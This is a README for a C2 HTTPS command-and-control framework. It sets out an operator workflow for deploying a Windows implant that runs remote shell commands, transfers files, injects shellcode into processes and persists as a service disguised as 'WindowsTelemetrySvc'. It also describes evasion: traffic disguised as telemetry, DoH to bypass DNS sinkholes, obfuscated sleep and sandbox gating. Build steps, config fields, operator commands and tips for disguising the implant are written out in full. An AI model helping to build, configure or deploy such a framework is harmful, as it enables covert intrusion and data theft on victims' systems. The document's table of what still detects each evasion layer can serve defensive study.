<div align="center">

# C2 HTTPS

**TLS ingress · Windows implant · operator console**

Command-and-control framework over HTTPS. Three binaries and a shared protocol layer.
Application-layer channel: X25519 + HKDF-SHA256 + ChaCha20-Poly1305. Public-key pinning
on the implant. DoH resolution. Jittered beacon with quiet hours. Obfuscated sleep.
Configurable persistence.

![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?logo=windows&logoColor=white)
![server](https://img.shields.io/badge/server-Linux%20%7C%20WSL2-FCC624?logo=linux&logoColor=black)
![language](https://img.shields.io/badge/C%2B%2B-17-00599C?logo=cplusplus&logoColor=white)
![build](https://img.shields.io/badge/CMake-3.20%2B-064F8C?logo=cmake&logoColor=white)
![license](https://img.shields.io/badge/license-MIT-green)

</div>

---

## Table of contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Components](#components)
- [Prerequisites](#prerequisites)
- [Build](#build)
- [Provisioning](#provisioning)
- [Operation](#operation)
- [Protocol](#protocol)
- [Channel security](#channel-security)
- [Evasion and detection surface](#evasion-and-detection-surface)
- [Known limitations](#known-limitations)
- [Testing](#testing)
- [Diagnostics](#diagnostics)
- [File structure](#file-structure)
- [License](#license)

---

## Overview

The framework is a three-tier system: an implant running on the target Windows host, a TLS ingress server that terminates the implant channel, and an operator interface reachable through loopback. The implant and the server exchange sealed messages over ordinary HTTPS, indistinguishable from telemetry traffic at the transport layer.

| Layer | Language | Stack |
| :--- | :--- | :--- |
| Server | C++17 | OpenSSL (TLS), POSIX sockets |
| Implant | C++17 | WinHTTP, Win32, `/MT` (static CRT) |
| Operator | C++17 | POSIX / WinSock sockets |
| Protocol | C++17 | In-tree, no external dependency |

Cryptographic primitives are implemented inside `shared/crypto.cpp` with no linking against OpenSSL. On Windows the source of entropy is `BCryptGenRandom`; elsewhere it is `/dev/urandom`. Only the server requires OpenSSL, and only for the TLS listener.

---

## Architecture

```text
                     ┌───────────────────────────────────────────────┐
                     │           TLS ingress   :443                  │
   implant ──POST───▶│  ┌─────────────────────────────────────────┐  │
   /api/v2/telemetry │  │ HTTP parser → SessionRouter → TaskQueue │  │
                     │  └─────────────────────────────────────────┘  │
                     │  ┌─────────────────────────────────────────┐  │
                     │  │ SessionStore (jsonl) · WebUI (embedded) │  │
                     │  └─────────────────────────────────────────┘  │
                     └───────────────────────────────────────────────┘
                                            │
                     ┌──────────────────────┴───────────────────────┐
                     │        Operator loopback   :8443            │
                     │   /op/ping  /op/sessions  /op/task  /op/...  │
                     └──────────────────────────────────────────────┘
                       ▲                                ▲
                       │                                │
                CLI (c2operator)              Web console (browser)
```

### Lifecycle

The session lifetime proceeds through four message types:

1. **Hello** — the implant generates an ephemeral X25519 key pair and submits the 32-byte public component without `X-Session-Id`. The server derives the session key, computes the `sid`, and returns `Seal(key, server_pub ‖ sid)`.
2. **Beacon** — the implant sends `X-Op: 1` at each jittered interval and receives either a queued command or `NoTask`.
3. **Task** — the operator enqueues a command through the loopback listener; the server delivers it on the next beacon.
4. **Result** — the implant executes and returns the outcome on the following POST with `X-Op: 2`. The server confirms the task and removes it from the queue.

The `sid` is `hex(client_pub[0:16])` — 32 hexadecimal characters. The session key never traverses the wire; only the ephemeral public components are exchanged.

---

## Components

| Directory | Contents |
| :--- | :--- |
| `shared/` | Wire protocol (`proto`), cryptographic primitives (`crypto`) |
| `server/` | TLS listener, session router, task queue, session store, operator routes, embedded web console |
| `implant/` | DoH resolver, beacon loop, task execution, obfuscated sleep (Ekko), persistence, sandbox gate |
| `operator/` | REPL that speaks to the server over `127.0.0.1:8443` |
| `webui/` | `index.html`, `app.css`, `app.js`, and `embed.py` producing `webui.h` |

The implanter's crypto is self-contained. The server's crypto is also self-contained except for the TLS listener, which is the only file that includes OpenSSL headers (`tls_listener.cpp`).

---

## Prerequisites

| Requirement | Purpose | Notes |
| :--- | :--- | :--- |
| CMake ≥ 3.20 | Build system | |
| C++17 toolchain | Compilation | MinGW-w64 (GCC 14.1 validated) or MSVC 2022 |
| OpenSSL dev headers | **Server only** | `libssl-dev` / `openssl-devel` |
| Python 3 | Optional | Regenerates `webui.h` after changes to the console |
| Windows 10 / 11 x64 | Target | Implant runs here |
| Linux or WSL2 | Server host | POSIX sockets; the server does not compile under native Windows |

> [!IMPORTANT]
> The server source includes `<arpa/inet.h>`, `<netinet/in.h>`, `<sys/socket.h>`, and `<unistd.h>`. These are POSIX headers. The server does not build under MinGW-w64 or MSVC. Run it under Linux or WSL2; connect VS Code to the WSL environment for a working terminal.

The implant links against the Windows SDK only and requires no VC++ Redistributable — the CRT is statically linked with `/MT`.

---

## Build

### 1. Server and operator

```bash
cmake -S . -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build -j
```

Output: `build/c2server`, `build/c2operator`.

### 2. Implant

```bat
cmake -S . -B build -G "MinGW Makefiles" -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

Output: `build/implant.exe`.

### 3. Web console

The console assets are embedded into `webui.h` at build time. After any change under `webui/`:

```bash
python3 webui/embed.py
```

Then rebuild. A stale `webui.h` results in an outdated console served by the TLS listener.

### 4. WSL2 deployment (recommended for the server)

Native Windows will not build the server. The supported pattern is:

```bash
wsl --install -d Ubuntu                          # one-time, from PowerShell
sudo apt update && sudo apt install -y \
    build-essential cmake libssl-dev python3     # inside WSL
cp -r /mnt/c/Users/<user>/Downloads/<project> ~/c2
cd ~/c2 && rm -rf build && cmake -S . -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build -j
```

> [!NOTE]
> WSL2 auto-forwards ports bound to `0.0.0.0`, so the server running under WSL is reachable from Windows at `127.0.0.1:443` without manual port forwarding. Building under `/mnt/c` is discouraged — permission semantics differ and builds are slower.

---

## Provisioning

### 1. TLS certificate

The implant's trust anchor is X25519 at the application layer. The TLS certificate is transport only and may be self-signed.

```bash
mkdir -p certs
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
  -keyout certs/server.key -out certs/server.crt \
  -subj "/CN=cdn-metrics.example.com" \
  -addext "subjectAltName=DNS:cdn-metrics.example.com"
chmod 600 certs/server.key
```

The `CN` must match `kBeaconHost` in `implant/config.h`. Certificate verification is disabled at the transport layer, but the `Host:` header matches the `CN`; keeping them aligned avoids noise under TLS inspection.

### 2. Server X25519 key pair

On boot the server prints the public key and a reminder to pin it:

```text
[*] server x25519 pub: <64 hex>
[*] pin this key into implant config.h
```

> [!WARNING]
> The key pair is generated per process. After every restart the pin changes, and every previously delivered implant remains in `Hello` indefinitely. For operational use, persist the pair on disk. Replace the generation block in `server/main.cpp`:

```cpp
// language: C++, file: server/main.cpp
static crypto::KeyPair LoadOrCreateServerKey(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (f) {
        std::vector<uint8_t> raw(64);
        f.read(reinterpret_cast<char*>(raw.data()), 64);
        if (f.gcount() == 64) {
            crypto::KeyPair kp;
            kp.priv.assign(raw.begin(), raw.begin() + 32);
            kp.pub.assign(raw.begin() + 32, raw.end());
            return kp;
        }
    }
    auto kp = crypto::GenerateX25519();
    std::ofstream o(path, std::ios::binary | std::ios::trunc);
    o.write(reinterpret_cast<const char*>(kp.priv.data()), 32);
    o.write(reinterpret_cast<const char*>(kp.pub.data()), 32);
    ::chmod(path.c_str(), S_IRUSR | S_IWUSR);
    return kp;
}
```

The private component never leaves the server host. Only the public component is distributed with the implant.

### 3. `implant/config.h`

| Field | Default | Purpose |
| :--- | :--- | :--- |
| `kBeaconHost` | `cdn-metrics.example.com` | Server domain — must equal the certificate `CN` |
| `kBeaconPath` | `/api/v2/telemetry` | POST path |
| `kBeaconPort` | `443` | TLS listener port |
| `kServerPin` | zeros | 32 bytes of the server public key |
| `kInfo` | `c2-session-v2` | HKDF context string — must match on both sides |
| `kDohV4` / `kDohV6` / `kDohAlt` | Cloudflare / Google | Resolution templates |
| `kSleepMs` | `60000` | Base beacon interval |
| `kJitterPct` | `40` | Variation, up and down |
| `kQuietStartH` / `kQuietEndH` | `2` / `5` | Quiet window (local time) |
| `kQuietSleepMs` | `14400000` | Sleep inside the quiet window |
| `kUseEkko` | `true` | Obfuscated sleep |
| `kSandboxGate` | `true` | Detonation gate |
| `kPersist` | `ScheduledTask` | `RunKey`, `ScheduledTask`, or `Service` |
| `kPersistName` | `WindowsTelemetrySvc` | Value / task / service name |
| `kUserAgent` | Chrome 120 | Transport user agent |

> [!IMPORTANT]
> The implant refuses to start if `kServerPin` is the shipped zero array. Every `Hello` fails the pin check and the process cycles until terminated.

---

## Operation

### 1. Server

```bash
sudo ./build/c2server certs/server.crt certs/server.key 443
```

```text
[*] server x25519 pub: 6f3a…
[*] pin this key into implant config.h
[*] restored 0 session records
[*] listening on :443
```

`sudo` is required for port 443. For non-privileged operation, use a high port and update `kBeaconPort` accordingly.

Two listeners are opened:

| Listener | Port | Protocol | Purpose |
| :--- | :--- | :--- | :--- |
| Ingress | 443 | TLS | Implant + web console |
| Operator | 127.0.0.1:8443 | Plain HTTP | CLI and local integrations |

> [!NOTE]
> Port 8443 is bound to loopback only. Remote operator access requires an SSH tunnel. Never expose the operator port directly.

### 2. Command-line operator

```bash
./build/c2operator
```

| Command | Effect |
| :--- | :--- |
| `sessions` | Lists `sid`, host, user, OS, age, pending count |
| `use <sid>` | Selects the active session |
| `shell <cmd>` | `cmd.exe /c <cmd>` on the target; returns exit code (u32 LE) + stdout/stderr |
| `upload <local> <remote>` | Writes a local file to the target |
| `download <remote>` | Reads a file from the target and returns the bytes |
| `sleep <ms> <jitter%>` | Adjusts the beacon cadence at runtime |
| `exit` | `ExitProcess` on the target |
| `quit` | Terminates the operator |

### 3. Web console

Served by the TLS listener from the embedded assets:

```text
https://<host>:443/
```

Four panels per session — `shell`, `files`, `beacon`, `output`. The console polls `/op/sessions` every 3 s and `/op/results` every 2 s.

### 4. Operator routes

| Route | Method | Body | Response |
| :--- | :--- | :--- | :--- |
| `/op/ping` | GET | — | `{"ok":true}` |
| `/op/sessions` | GET | — | Array of sessions |
| `/op/task` | POST | `{"sid","op","payload" (hex)}` | `{"ok":true,"task_id":N}` |
| `/op/results` | POST | `{"sid"}` | Array of results (drains the queue) |
| `/op/kill` | POST | `{"sid"}` | Marks the session dead and drops its queue |

> [!TIP]
> The `Inject` opcode (`0x23`) has no CLI or console shortcut. Enqueue it directly via `/op/task` with payload `u32 pid (LE) ‖ shellcode`.

---

## Protocol

### 1. Transport

`POST /api/v2/telemetry` · `Content-Type: application/octet-stream`

| Header | Present on | Value |
| :--- | :--- | :--- |
| `X-Op` | all | `1` beacon · `2` result · `3` hello |
| `X-Session-Id` | beacon, result | `sid` (32 hex) |
| `X-Host` / `X-User` / `X-Os` | hello | Session metadata |

Body = sealed envelope: `nonce(12) ‖ ciphertext ‖ tag(16)`.

### 2. Wire format

```text
version  u16   (2)
op       u8
status   u8
task_id  u32
sid_len  u8
sid      [sid_len]
payload  [remainder]
```

All integers are little-endian. The HTTP parser enforces a 32 MiB body limit.

### 3. Handshake

| Step | Direction | Content |
| :--- | :--- | :--- |
| 1 | implant → server | 32 bytes: ephemeral X25519 public key, without `X-Session-Id` |
| 2 | server → implant | `Seal(key, server_pub ‖ sid)` |
| 3 | implant | Verifies `server_pub == kServerPin`; derives `key` with the same `kInfo` |

The session key is `HKDF-SHA256(shared, info = kInfo)` over the X25519 secret. The `sid` identifies the session on the server; the key is never transmitted.

### 4. Commands

| Op | Value | Payload | Result |
| :--- | :--- | :--- | :--- |
| `Shell` | `0x20` | Command (bytes) | `u32 exit ‖ stdout/stderr` |
| `Upload` | `0x21` | `u16 len ‖ path ‖ data` | Text message |
| `Download` | `0x22` | `u16 len ‖ path` | Raw file bytes |
| `Inject` | `0x23` | `u32 pid ‖ shellcode` | Text message |
| `Sleep` | `0x24` | `u32 ms ‖ u32 jitter%` | `"ok"` |
| `Exit` | `0x25` | — | Process termination |

Server responses carry the same `op` as the corresponding command with `task_id` set, or `0x11` (`NoTask`) when the queue is empty.

---

## Channel security

| Layer | Primitive | Covers | Does not cover |
| :--- | :--- | :--- | :--- |
| Transport | TLS 1.2+ (ECDHE, AES-GCM or ChaCha20) | Passive interception | MITM with a trusted CA |
| Pin | X25519 verified in the implant | MITM even with a trusted CA | Public key extraction from the binary |
| Session | HKDF-SHA256 | Per-session context separation | — |
| Record | ChaCha20-Poly1305 | Payload integrity and confidentiality | Traffic analysis |

The pin is what holds the channel together. Anyone with control over the binary can extract the public key and impersonate the server. The defense against this is per-build pin rotation, not the TLS layer.

---

## Evasion and detection surface

| Layer | Defeats | Still caught by |
| :--- | :--- | :--- |
| DoH | DNS sinkhole, local resolver | Firewall blocking `1.1.1.1` / `8.8.8.8`; SNI under TLS inspection |
| Pin X25519 | MITM with a trusted CA | Public key extraction from the binary |
| Jitter + quiet hours | Simple temporal patterns | Long-window interval correlation |
| Ekko | Idle-memory scans | ETW Threat-Intelligence; repeated `VirtualProtect` RW→RX |
| PEB walk / dynamic resolution | Static IAT hooks | Stub-level `ntdll` hooks, kernel callbacks |
| Sandbox gate | Automated detonation | Legitimate CI hosts (low uptime → false positive) |
| RunKey / schtasks | Reboot without re-execution | Autoruns, Sysmon 13, 4698, 7045 |

No layer here is undetectable. Each layer buys time. An EDR with kernel callbacks and protected memory defeats Ekko; TLS inspection with pin extraction defeats the transport. Evasion is re-derived per build.

---

## Known limitations

- **Ephemeral X25519 pair** — the pin breaks on each server restart. See [Provisioning §2](#2-server-x25519-key-pair).
- **No task retry** — `TaskQueue::Confirm` removes by id. A delivered but unconfirmed task is not redelivered.
- **Minimal validation** — `Sleep` assumes 8 bytes and `Inject` assumes a 4-byte header; no size check beyond the minimum.
- **Simplified Ekko** — `CallbackRestore` and `CallbackA` do not reproduce the full frame context of the original implementation. Test in a VM before operation.
- **Unencrypted store** — `session_store` writes metadata in plaintext (`SkipKeys` is the default). With `StoreKeys`, the session key is written in hex to the file.
- **Incomplete restoration** — `sessions.jsonl` is read at boot only for counting. Restored sessions are not inserted back into the router and return as dead.
- **Plaintext operator channel** — loopback `:8443`, no authentication of its own. Use a tunnel.
- **Bounded result queue** — 256 entries per session; the oldest entries are dropped.
- **10-minute sweeper** — sessions without a beacon for 10 minutes are removed. The implant recovers automatically via a new `Hello`.

---

## Testing

Run the server on an isolated VM with no external route. The implant is pointed at `127.0.0.1` or the VM host; the DoH resolver fails and falls back to the system resolver.

```bash
sudo ./build/c2server certs/server.crt certs/server.key 443
```

### 1. Verify the server without an implant

```bash
curl -s http://127.0.0.1:8443/op/ping
# {"ok":true}

curl -s http://127.0.0.1:8443/op/sessions
# []

curl -sk https://127.0.0.1:443/ | head -5
# <!DOCTYPE html> ...
```

### 2. Attach the implant

Compile with `kSandboxGate = false`, `kUseEkko = false`, and `kPersist = None` for the first run. Point `kBeaconHost` at the server and set `kServerPin` to the boot output.

Launch `implant.exe`. The implant sleeps 5–45 s randomly at start, then attempts `Hello`. Within ~60 s the session appears:

```bash
curl -s http://127.0.0.1:8443/op/sessions | python3 -m json.tool
```

### 3. First command

```bash
./build/c2operator
c2> sessions
c2> use <sid>
c2> shell whoami
[+] enqueued
```

The `[+] enqueued` line only confirms queue insertion. The result returns on the next beacon (up to `kSleepMs` plus jitter). Confirm via:

```bash
curl -s http://127.0.0.1:8443/op/results -d '{"sid":"<sid>"}' | python3 -m json.tool
```

The first 8 hex characters of `data` are the exit code (u32 LE); the rest is the command output.

> [!TIP]
> Reduce the cadence before testing to avoid waiting a full minute: `c2> sleep 5000 10`. Confirm the change takes effect in the next result (`"data": "6f6b"` = `ok`).

### 4. Traffic inspection

```bash
sudo tcpdump -i any -A 'tcp port 443' -c 20
```

The bodies are ChaCha20-Poly1305 sealed. In clear text only the HTTP headers appear: `X-Op`, `X-Session-Id`, `X-Host`, `X-User`, `X-Os`.

---

## Diagnostics

| Symptom | Probable cause | Fix |
| :--- | :--- | :--- |
| `sessions` empty with a live implant | `sid` from `Hello` ≠ `sid` of the session | Check the server log |
| Implant stuck in `Hello` | `kServerPin` ≠ current server public key | Recompile with the new pin |
| Beacon returns 404 | Session swept after 10 min | Automatic — new `Hello` |
| Server fails to start | Invalid certificate, key, or port | Validate with `openssl x509 -noout -modulus` |
| `OPENSSL_INCLUDE_DIR-NOTFOUND` | OpenSSL development headers missing | Install the dev package or set `OPENSSL_ROOT_DIR` |
| Operator cannot connect | `:8443` unavailable | Check the boot message |
| Web console renders blank | `webui.h` out of date | Run `python3 webui/embed.py` and rebuild |
| `c2server` not found on Windows | POSIX build attempted under PowerShell | Use WSL2 (see [Build §4](#4-wsl2-deployment-recommended-for-the-server)) |

---

## File structure

```text
.
├── CMakeLists.txt
├── README.md
├── certs/                  # generated TLS certificate and key
│   ├── server.crt
│   └── server.key
├── shared/
│   ├── crypto.cpp          # X25519, HKDF, ChaCha20-Poly1305, SHA-256
│   ├── crypto.h
│   ├── proto.cpp           # wire encode / decode
│   └── proto.h
├── server/
│   ├── main.cpp            # boot, X25519 pair, listener wiring
│   ├── tls_listener.cpp    # OpenSSL TLS termination
│   ├── op_listener.cpp     # loopback :8443
│   ├── op_routes.cpp       # /op/* endpoints
│   ├── session_router.cpp  # session registry and task-id allocation
│   ├── session_store.cpp   # sessions.jsonl persistence
│   ├── task_queue.cpp      # per-session task and result queues
│   ├── http_frame.cpp      # HTTP/1.1 parser
│   └── webui.h             # embedded console (generated by webui/embed.py)
├── implant/
│   ├── main.cpp            # beacon loop and state machine
│   ├── config.h            # pin, cadence, persistence settings
│   ├── doh_resolver.cpp    # DoH resolution with system fallback
│   ├── ekko.cpp            # obfuscated sleep
│   ├── evade.cpp           # sandbox gate, dynamic resolution
│   ├── persistence.cpp     # RunKey / schtasks / service install
│   ├── tasks.cpp           # shell, upload, download, inject
│   └── transport.cpp       # WinHTTP POST
├── operator/
│   ├── main.cpp            # REPL entry point
│   ├── commands.cpp        # command dispatch
│   └── protocol.cpp        # HTTP client to :8443
└── webui/
    ├── index.html
    ├── app.css
    ├── app.js
    └── embed.py            # generates webui.h
```

---

## License

Released under the **MIT** license. See [`LICENSE`](LICENSE) for the full text.

<div align="center">

---

Built for offensive security research and reverse-engineering practice.

</div>
